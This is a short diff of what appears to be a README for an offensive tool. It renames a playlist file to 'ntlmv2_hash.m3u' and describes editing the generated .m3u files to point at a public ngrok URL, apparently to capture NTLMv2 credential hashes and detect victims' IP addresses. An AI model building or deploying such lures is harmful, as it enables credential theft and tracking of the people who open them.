@@ -88,7 +88,7 @@ For easier public accessibility, especially if you're behind NAT or a firewall, 
 4. Ngrok will provide a public URL (like `https://a1b2c3d4.ngrok.io`)
 5. Manually edit the generated .m3u files to use this ngrok URL instead of your IP:
    ```
-   # Edit ipltlmhash.m3u to contain:
+   # Edit ntlmv2_hash.m3u to contain:
    https://a1b2c3d4.ngrok.io/somefile.mp3
    
    # Edit ip_detect.m3u to contain:
